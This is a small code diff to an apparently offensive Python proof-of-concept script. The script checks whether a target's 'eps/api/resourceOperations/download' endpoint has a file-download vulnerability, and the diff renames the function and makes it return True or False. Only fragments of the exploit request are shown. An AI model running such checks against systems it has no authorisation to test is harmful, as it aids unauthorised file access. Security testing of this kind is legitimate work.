@@ -26,7 +26,7 @@ def md5encode(url):
     return input_name.hexdigest().upper()
 
 
-def poc(url):
+def poc_download(url):
     if url.endswith("/"):
         path = "eps/api/resourceOperations/download?token="
     else:
@@ -39,8 +39,10 @@ def poc(url):
         response = requests.post(url=pocurl, headers=head, data=data, verify=False, timeout=3)
         if response.status_code == 200:
             print(Fore.GREEN + f"[+]{url}存在文件下载漏洞！！！！")
+            return True
         else:
             print(Fore.RED + f"[-]{url}不存在文件下载漏洞")
+            return False
     except:
         pass
 
